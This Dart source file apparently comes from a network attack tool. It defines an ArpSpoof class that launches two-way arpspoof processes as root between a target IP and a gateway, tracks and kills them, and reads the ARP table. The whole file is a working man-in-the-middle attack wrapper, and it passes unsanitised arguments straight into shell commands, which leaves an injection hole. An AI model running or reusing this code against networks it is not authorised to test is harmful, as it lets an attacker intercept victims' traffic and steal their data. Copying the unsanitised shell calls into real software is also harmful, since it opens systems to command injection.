import '../core/shell_executor.dart';

class ArpSpoof {
  final ShellExecutor _shell = ShellExecutor.instance;
  bool _isActive = false;
  List<int> _processPids = [];

  Future<void> startSpoofing(String targetIp, String gatewayIp, String interface) async {
    if (_isActive) {
      throw Exception('ARP spoofing is already active');
    }

    try {
      // Start spoofing target -> gateway
      final result1 = await _shell.executeCommand(
        'arpspoof -i $interface -t $targetIp $gatewayIp &',
        requireRoot: true,
      );

      // Start spoofing gateway -> target
      final result2 = await _shell.executeCommand(
        'arpspoof -i $interface -t $gatewayIp $targetIp &',
        requireRoot: true,
      );

      if (result1.exitCode == 0 && result2.exitCode == 0) {
        _isActive = true;
        
        // Get process IDs for cleanup
        final psResult = await _shell.executeCommand('pgrep arpspoof');
        if (psResult.exitCode == 0) {
          final pids = psResult.stdout.toString().trim().split('\n');
          _processPids = pids.map((pid) => int.tryParse(pid) ?? 0).where((pid) => pid > 0).toList();
        }
      } else {
        throw Exception('Failed to start ARP spoofing processes');
      }
    } catch (e) {
      throw Exception('ARP spoofing failed: $e');
    }
  }

  Future<void> stopSpoofing() async {
    if (!_isActive) {
      throw Exception('ARP spoofing is not currently active');
    }

    try {
      // Kill specific arpspoof processes
      for (final pid in _processPids) {
        await _shell.executeCommand('kill $pid', requireRoot: true);
      }

      // Fallback: kill all arpspoof processes
      await _shell.executeCommand('killall arpspoof', requireRoot: true);

      _isActive = false;
      _processPids.clear();
    } catch (e) {
      throw Exception('Failed to stop ARP spoofing: $e');
    }
  }

  Future<List<String>> getArpTable() async {
    try {
      final result = await _shell.executeCommand('arp -a');
      if (result.exitCode == 0) {
        return result.stdout.toString().split('\n')
            .where((line) => line.trim().isNotEmpty)
            .toList();
      }
      return [];
    } catch (e) {
      throw Exception('Failed to get ARP table: $e');
    }
  }

  bool get isActive => _isActive;
}